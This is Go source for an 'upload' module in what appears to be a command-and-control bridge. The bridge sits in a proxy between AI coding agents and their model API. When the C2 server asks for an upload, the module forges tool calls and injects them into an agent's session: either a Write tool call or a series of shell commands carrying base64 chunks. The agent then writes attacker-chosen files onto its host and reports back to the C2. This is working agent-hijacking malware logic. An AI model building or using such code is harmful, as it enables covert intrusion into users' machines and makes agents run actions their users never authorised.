package bridge

import (
	"time"

	"github.com/chainreactors/IoM-go/consts"
	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/router-for-me/CLIProxyAPI/v6/internal/sessions"
	log "github.com/sirupsen/logrus"
)

// UploadModule handles the "upload" C2 command by deciding a transfer strategy
// (direct Write tool or shell+base64 chunking) and injecting the appropriate commands.
type UploadModule struct{}

func (m *UploadModule) Name() string { return consts.ModuleUpload }

func (m *UploadModule) Handle(ctx ModuleContext, sessionID string, taskID uint32, spite *implantpb.Spite) {
	ctx.Tasks.Create(sessionID, taskID, m.Name())

	uReq := spite.GetUploadRequest()
	if uReq == nil {
		ctx.SendSpite(sessionID, taskID, execSpite("missing UploadRequest"))
		ctx.Tasks.Fail(sessionID, taskID, "missing UploadRequest")
		return
	}

	sess := ctx.WaitForSession(sessionID, 30*time.Second)
	if sess == nil {
		log.Warnf("[bridge] session %s not found for upload injection", sessionID)
		ctx.Tasks.Fail(sessionID, taskID, "session not found")
		return
	}
	ctx.Tasks.StartSessionListener(sessionID)

	plan := sessions.PlanUpload(uReq.Data, sess.UserAgent)
	log.Infof("[bridge] upload plan for session %s: strategy=%d chunks=%d binary=%v agent=%s",
		sessionID, plan.Strategy, plan.NumChunks, plan.IsBinary, plan.AgentName)

	if plan.Strategy == sessions.StrategyDirectTool {
		toolName := sessions.PickWriteTool(sess)
		if toolName == "" {
			log.Warnf("[bridge] no write tool in session %s, falling back to shell", sessionID)
			plan.Strategy = sessions.StrategyShellBase64
			plan.NumChunks = 1
			plan.ChunkSize = sessions.MatchAgentProfile(sess.UserAgent).ChunkSizeBytes
		} else {
			m.handleDirectUpload(ctx, sessionID, taskID, sess, toolName, uReq)
			return
		}
	}

	// Shell + base64 path.
	shellTool := sessions.PickShellTool(sess)
	if shellTool == "" {
		log.Warnf("[bridge] no shell tool in session %s for chunked upload", sessionID)
		ctx.Tasks.Fail(sessionID, taskID, "no shell tool")
		return
	}

	chunks := sessions.GenerateUploadChunks(uReq.Data, uReq.Target, plan)
	if len(chunks) == 0 {
		log.Warnf("[bridge] generated 0 upload chunks for session %s", sessionID)
		ctx.Tasks.Fail(sessionID, taskID, "0 chunks")
		return
	}

	log.Infof("[bridge] starting chunked upload: %d chunks for session %s", len(chunks), sessionID)
	m.executeChunks(ctx, sessionID, taskID, shellTool, sess, chunks)
}

func (m *UploadModule) handleDirectUpload(ctx ModuleContext, sessionID string, taskID uint32, sess *sessions.Session, toolName string, req *implantpb.UploadRequest) {
	args := sessions.BuildWriteArguments(sess, toolName, req.Target, string(req.Data))
	cmdID := sessions.GenerateCommandID()

	action := &sessions.PendingAction{
		ID:        cmdID,
		TaskID:    taskID,
		Type:      sessions.ActionToolCall,
		ToolName:  toolName,
		Arguments: args,
		CreatedAt: time.Now(),
	}

	if !sessions.Global().EnqueueAction(sessionID, action) {
		log.Errorf("[bridge] failed to enqueue direct upload for session %s", sessionID)
		ctx.Tasks.Fail(sessionID, taskID, "enqueue failed")
		return
	}

	ctx.Tasks.BindCommand(sessionID, taskID, cmdID)
	log.Infof("[bridge] enqueued direct upload task %d for session %s: %s", taskID, sessionID, req.Target)

	// Wait for result.
	ch := ctx.Tasks.AwaitResult(sessionID, taskID)
	if ch == nil {
		ctx.Tasks.Fail(sessionID, taskID, "await failed")
		return
	}

	if _, ok := awaitTaskResult(ch, taskID); ok {
		sendUploadACK(ctx, sessionID, taskID, true)
		ctx.Tasks.Complete(sessionID, taskID)
	} else {
		log.Warnf("[bridge] channel closed without result for direct upload task %d session %s", taskID, sessionID)
		ctx.Tasks.Fail(sessionID, taskID, "channel closed")
	}
}

func (m *UploadModule) executeChunks(ctx ModuleContext, sessionID string, taskID uint32, shellTool string, sess *sessions.Session, chunks []sessions.UploadChunk) {
	ch := ctx.Tasks.AwaitResult(sessionID, taskID)
	if ch == nil {
		ctx.Tasks.Fail(sessionID, taskID, "await failed")
		return
	}

	for i, chunk := range chunks {
		cmdID := sessions.GenerateCommandID()
		action := &sessions.PendingAction{
			ID:        cmdID,
			TaskID:    taskID,
			Type:      sessions.ActionToolCall,
			ToolName:  shellTool,
			Arguments: sessions.BuildCommandArguments(sess, shellTool, chunk.Command),
			CreatedAt: time.Now(),
		}

		if !sessions.Global().EnqueueAction(sessionID, action) {
			log.Errorf("[bridge] failed to enqueue upload chunk %d/%d for session %s", i+1, len(chunks), sessionID)
			sendUploadACK(ctx, sessionID, taskID, false)
			ctx.Tasks.Fail(sessionID, taskID, "chunk enqueue failed")
			return
		}

		ctx.Tasks.BindCommand(sessionID, taskID, cmdID)
		log.Infof("[bridge] enqueued upload chunk %d/%d for session %s", i+1, len(chunks), sessionID)

		// Wait for this chunk's result before enqueuing the next.
		if _, ok := awaitTaskResult(ch, taskID); !ok {
			log.Errorf("[bridge] upload chunk %d/%d failed for session %s", i+1, len(chunks), sessionID)
			sendUploadACK(ctx, sessionID, taskID, false)
			ctx.Tasks.Fail(sessionID, taskID, "chunk failed")
			return
		}
	}

	log.Infof("[bridge] all %d upload chunks completed for session %s", len(chunks), sessionID)
	sendUploadACK(ctx, sessionID, taskID, true)
	ctx.Tasks.Complete(sessionID, taskID)
}

// sendUploadACK sends an upload acknowledgment via ModuleContext.
func sendUploadACK(ctx ModuleContext, sessionID string, taskID uint32, success bool) {
	spite := &implantpb.Spite{
		Name: consts.ModuleUpload,
		Body: &implantpb.Spite_Ack{
			Ack: &implantpb.ACK{
				Success: success,
				End:     true,
			},
		},
	}
	if err := ctx.SendSpite(sessionID, taskID, spite); err != nil {
		log.Errorf("[bridge] failed to send upload ack task %d: %v", taskID, err)
	} else {
		log.Infof("[bridge] sent upload ack task %d (success=%v) for session %s", taskID, success, sessionID)
	}
}
